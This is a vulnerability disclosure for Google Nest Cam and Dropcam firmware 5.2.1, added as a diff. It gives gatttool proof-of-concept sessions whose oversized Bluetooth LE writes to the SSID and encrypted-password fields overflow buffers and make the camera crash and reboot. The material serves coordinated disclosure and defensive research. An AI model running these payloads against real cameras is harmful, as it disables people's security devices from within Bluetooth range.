@@ -1,0 +1,58 @@
+# Exploit Title: Google Nest Cam - Multiple Buffer Overflow Conditions Over Bluetooth LE
+# Reported to Google: October 26, 2016
+ # Public Disclosure: March 17, 2017
+# Exploit Author: Jason Doyle @_jasondoyle
+# Vendor Homepage: https://nest.com/
+# Affected: Dropcam, Dropcam Pro, Nest Cam Indoor/Outdoor models 
+# Tested Version: 5.2.1 
+# Fixed Version: TBD
+# https://github.com/jasondoyle/Google-Nest-Cam-Bug-Disclosures/blob/master/README.md 
+
+==Bluetooth (BLE) based Buffer Overflow via SSID parameter==
+
+1. Summary 
+
+It's possible to trigger a buffer overflow condition when setting the SSID parameter on the camera. The attacker must be in bluetooth range at any time during the cameras powered on state. Bluetooth is never disabled even after initial setup.
+
+2. Proof of Concept
+
+ anon@ubuntu:~/nest$ gatttool -b 18:B4:30:5D:00:B8 -t random -I 
+[18:B4:30:5D:00:B8][LE]> connect 
+Attempting to connect to 18:B4:30:5D:00:B8 
+Connection successful
+ [18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3a031201AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ [18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3b 
+Characteristic value was written successfully
+ Characteristic value was written successfully 
+[18:B4:30:5D:00:B8][LE]> (gatttool:20352): GLib-WARNING **: Invalid file descriptor.
+
+3. Details 
+
+The payload attempts to set an SSID with a length of 1 byte and sends 16. SequenceNum=3a + Type=0312 + Length=01 + Value=AA*16
+
+4. Result 
+
+Crash and reboot back to operational state
+
+
+==Bluetooth (BLE) based Buffer Overflow via Encrypted Password parameter==
+
+1. Summary 
+
+It's possible to trigger a buffer overflow condition when setting the encrypted password parameter on the camera. The attacker must be in bluetooth range at any time during the cameras powered on state. Bluetooth is never disabled even after initial setup.
+
+2. Proof of Concept 
+
+anon@ubuntu:~/nest$ gatttool -b 18:B4:30:5D:00:B8 -t random -I 
+[18:B4:30:5D:00:B8][LE]> connect
+ Attempting to connect to 18:B4:30:5D:00:B8 
+Connection successful 
+[18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3a03120b506574536d6172742d356e1a01AAAAAA
+ [18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3b 
+Characteristic value was written successfully
+ Characteristic value was written successfully
+ [18:B4:30:5D:00:B8][LE]> (gatttool:20352): GLib-WARNING **: Invalid file descriptor.
+
+3. Details 
+
+The payload attempts to set the encrypted wifi password with a length of 1 byte and sends 3. SequenceNum=3a + Type=0312 + Length=0b + ssidVal=506574536d6172742d356e + type=1a + length=01 + encPass=AA*3
